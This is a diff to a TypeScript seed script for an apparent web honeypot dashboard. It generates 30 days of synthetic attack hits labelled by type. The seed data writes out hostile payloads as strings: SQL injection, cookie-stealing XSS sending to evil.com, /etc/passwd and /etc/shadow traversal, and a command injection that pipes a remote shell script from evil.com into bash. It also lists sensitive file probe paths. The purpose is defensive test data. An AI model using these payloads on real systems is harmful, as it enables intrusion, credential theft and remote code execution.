@@ -256,6 +256,161 @@ async function buildSession(spec: SessionSpec) {
   await prisma.event.createMany({ data: events, skipDuplicates: true })
 }
 
+// ─── Web hit seed data ────────────────────────────────────────────────────────
+
+const WEB_USER_AGENTS = [
+  "sqlmap/1.7.8#stable (https://sqlmap.org)",
+  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
+  "python-requests/2.31.0",
+  "Nikto/2.1.6",
+  "curl/7.88.1",
+  "Go-http-client/1.1",
+  "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
+  "nuclei - open-source project (github.com/projectdiscovery/nuclei)",
+  "Mozilla/5.0 zgrab/0.x",
+  "WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)",
+  "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)",
+]
+
+const WEB_SCENARIOS: Array<{
+  attackType: string
+  method: "GET" | "POST"
+  paths: string[]
+  queries?: string[]
+  bodies?: string[]
+}> = [
+  {
+    attackType: "sqli",
+    method: "GET",
+    paths: ["/login", "/search", "/products", "/user"],
+    queries: [
+      "id=1' OR '1'='1",
+      "id=1 UNION SELECT username,password FROM users--",
+      "q=1' AND SLEEP(5)--",
+      "cat=1; DROP TABLE users--",
+      "id=1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+    ],
+  },
+  {
+    attackType: "sqli",
+    method: "POST",
+    paths: ["/login", "/admin/login", "/wp-login.php"],
+    bodies: [
+      "username=admin'--&password=anything",
+      "user=' OR 1=1--&pass=x",
+      "username=admin' /*&password=*/--",
+    ],
+  },
+  {
+    attackType: "xss",
+    method: "GET",
+    paths: ["/search", "/comment", "/feedback", "/profile"],
+    queries: [
+      "q=<script>alert(document.cookie)</script>",
+      "name=<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>",
+      "msg=<svg onload=alert(1)>",
+      "redirect=javascript:alert(1)",
+    ],
+  },
+  {
+    attackType: "lfi",
+    method: "GET",
+    paths: ["/download", "/file", "/include", "/view", "/page"],
+    queries: [
+      "file=../../../../etc/passwd",
+      "path=../../../etc/shadow",
+      "template=..%2F..%2F..%2Fetc%2Fpasswd",
+      "page=....//....//etc/passwd",
+      "include=/proc/self/environ",
+    ],
+  },
+  {
+    attackType: "cmdi",
+    method: "GET",
+    paths: ["/ping", "/lookup", "/util/exec", "/admin/test"],
+    queries: [
+      "host=127.0.0.1; cat /etc/passwd",
+      "ip=8.8.8.8 | id",
+      "domain=google.com && whoami",
+      "cmd=$(curl http://evil.com/shell.sh | bash)",
+    ],
+  },
+  {
+    attackType: "scanner",
+    method: "GET",
+    paths: [
+      "/wp-login.php", "/wp-admin/", "/.env", "/.git/config",
+      "/phpmyadmin/", "/admin/", "/backup.sql", "/config.php.bak",
+      "/xmlrpc.php", "/.htaccess", "/server-status", "/actuator/health",
+      "/api/swagger-ui.html", "/.DS_Store", "/web.config",
+    ],
+    queries: [""],
+  },
+  {
+    attackType: "info_disclosure",
+    method: "GET",
+    paths: [
+      "/config.yml", "/config.json", "/.env.production", "/.env.local",
+      "/docker-compose.yml", "/id_rsa", "/.bash_history", "/database.yml",
+    ],
+    queries: [""],
+  },
+  {
+    attackType: "recon",
+    method: "GET",
+    paths: ["/", "/robots.txt", "/sitemap.xml", "/favicon.ico", "/.well-known/security.txt"],
+    queries: [""],
+  },
+]
+
+async function seedWebHits() {
+  await prisma.webHit.deleteMany()
+
+  const hits: Parameters<typeof prisma.webHit.createMany>["0"]["data"] = []
+
+  for (let daysBack = 29; daysBack >= 0; daysBack--) {
+    const hitsPerDay = randInt(15, 60)
+
+    for (let i = 0; i < hitsPerDay; i++) {
+      const scenario = rand(WEB_SCENARIOS)
+      const ip       = rand(ATTACK_IPS).ip
+      const path     = rand(scenario.paths)
+      const query    = scenario.queries  ? rand(scenario.queries)  : ""
+      const body     = scenario.bodies   ? rand(scenario.bodies)   : ""
+      const ua       = rand(WEB_USER_AGENTS)
+
+      // Scanners and sqlmap get their own user agents
+      let userAgent = ua
+      if (scenario.attackType === "sqli")    userAgent = "sqlmap/1.7.8#stable (https://sqlmap.org)"
+      if (scenario.attackType === "scanner") userAgent = rand([
+        "Nikto/2.1.6",
+        "nuclei - open-source project (github.com/projectdiscovery/nuclei)",
+        "WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)",
+        "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
+      ])
+
+      hits.push({
+        id:         randomUUID(),
+        eventId:    randomUUID(),
+        srcIp:      ip,
+        method:     scenario.method,
+        path,
+        query:      query ?? "",
+        userAgent,
+        headers:    { "Host": "target.example.com", "User-Agent": userAgent },
+        body:       body ?? "",
+        attackType: scenario.attackType,
+        timestamp:  daysAgo(daysBack, 20),
+        createdAt:  new Date(),
+      })
+    }
+  }
+
+  await prisma.webHit.createMany({ data: hits, skipDuplicates: true })
+  return hits.length
+}
+
 // ─── Main ─────────────────────────────────────────────────────────────────────
 
 async function main() {
@@ -386,6 +541,10 @@ async function main() {
     }
   }
 
+  // ── 8. Web honeypot hits ──────────────────────────────────────────────────────
+  console.log("  [8/8] Web honeypot hits (SQLi, XSS, LFI, scanners, recon — 30 days)...")
+  const webHitCount = await seedWebHits()
+
   // Summary
   const sessionCount = await prisma.session.count()
   const eventCount   = await prisma.event.count()
@@ -393,8 +552,9 @@ async function main() {
 
   console.log(`
 ✅  Seed complete!
-    Sessions : ${sessionCount}
-    Events   : ${eventCount}
+    Sessions  : ${sessionCount}
+    Events    : ${eventCount}
+    Web hits  : ${webHitCount}
     Unique IPs: ${uniqueIps.length}
 
     Open http://localhost:4000 to explore the data.
